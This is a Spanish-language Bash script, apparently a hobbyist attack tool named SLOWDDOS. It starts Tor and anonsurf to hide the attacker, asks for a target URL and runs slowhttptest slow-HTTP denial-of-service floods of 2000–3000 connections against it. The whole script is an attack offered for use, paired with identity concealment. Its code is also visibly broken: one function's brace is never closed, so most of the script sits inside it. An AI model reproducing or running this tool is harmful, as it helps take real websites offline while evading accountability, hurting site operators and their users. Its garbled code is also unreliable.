#!/bin/bash

#MaxWice

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT 
    function ctrl_c() {
        exit
        echo "Saliendo"
    }
    echo
    function limpiar_pantalla {
        clear
    


echo "***************************************************************************+**"
echo -e "\e[0;31m\033[1mHerramienta para ataque de (dos) temporales a paginas web \n"
echo "***************************************************************************+**"

sleep 3s
limpiar_pantalla 
echo 
clear
echo
service="status"
back="stop"
anon="start"
ano="stop"
echo
echo -e "\e[0;34m\033[1m[*]Antes de Iniciar debemos proteger tu identidad"
sleep 5s
limpiar_pantalla
read -p "Escribe (tor) para iniciar el servicio:> " z
service $z start
sleep 5s
limpiar_pantalla
echo "\n"
limpiar_pantalla
sleep 3s
service tor $service
sleep 3s
echo -e "\033[0m\e[0m[*]Activando el servicio de (anonsurf)> "
sleep 3s
anonsurf $anon
limpiar_pantalla
echo
echo -e "------------------------------------------------------------------------------------------------------"
echo -e "               ███████╗██╗      ██████╗ ██╗    ██╗██████╗ ██████╗  ██████╗ ███████╗         "
echo -e "               ██╔════╝██║     ██╔═══██╗██║    ██║██╔══██╗██╔══██╗██╔═══██╗██╔════╝        "
echo -e "               ███████╗██║     ██║   ██║██║ █╗ ██║██║  ██║██║  ██║██║   ██║███████╗          "
echo -e "               ╚════██║██║     ██║   ██║██║███╗██║██║  ██║██║  ██║██║   ██║╚════██║         "
echo -e "               ███████║███████╗╚██████╔╝╚███╔███╔╝██████╔╝██████╔╝╚██████╔╝███████        "
echo -e "                                                                                                      "
echo -e "----------------------------------------Chako Hernandez-----------------------------------------------"

opciones="ᴀᴛᴀQᴜᴇ_ᴍᴇᴅɪᴏ ᴀᴛᴀQᴜᴇ_ᴀᴠᴀɴᴢᴀᴅᴏ ꜱᴀʟɪʀ"
select opcion in $opciones
do

    if [ $opcion = "ᴀᴛᴀQᴜᴇ_ᴍᴇᴅɪᴏ" ]; then
    sleep 3s
    limpiar_pantalla
    echo -e "\e[0;34m\033[1m[*]Cargando"
    sleep 3s
        read -p "Coloca la Url de la pagina a la cual vas atacar:> " a
        sleep 3s
        limpiar_pantalla
        sleep 2s
        echo -e "\e[0;34m\033[1m[*]Cargando"
        sleep 2s
        limpiar_pantalla
        slowhttptest -R -t 3010 -u $a -t HEAD -c 2000 -a 10 -b 3000 -r 500
        sleep 2s
        echo -e "\e[0;34m\033[1m[*]Ataque realizado"
        echo
        limpiar_pantalla
        elif [ $opcion = "ᴀᴛᴀQᴜᴇ_ᴀᴠᴀɴᴢᴀᴅᴏ" ]; then
        sleep 3s
    limpiar_pantalla
    echo -e "\e[0;34m\033[1m[*]Cargando"
    sleep 3s
            read -p "Coloca la Url de la pagina a la cual vas atacar:> " b
            sleep 3s
            limpiar_pantalla
            sleep 2s
            echo -e "\e[0;34m\033[1m[*]Cargando"
            sleep 2s
            limpiar_pantalla
            slowhttptest -R -c 3000 -H -g -o slowhttp -i 100 -r 200 -t GET -u $b -x 50 -p 3
            sleep 2s
            echo -e "\e[0;34m\033[1m[*]Ataque realizado\n"
            echo
            limpiar_pantalla
            elif [ $opcion = "ꜱᴀʟɪʀ" ]; then
            sleep 5s
            limpiar_pantalla
            echo -e "\e[0;33m\033[1m[*]Matando todos los servicios activados\n  "
            sleep 3s
            service tor $back
            sleep 3s
            limpiar_pantalla
            anonsurf $ano
            limpiar_pantalla
            sleep 3s
            echo -e "\e[0;32m\033[1m[*]Saliendo"
            sleep 2s
            limpiar_pantalla
            exit 0

        fi 
    done


























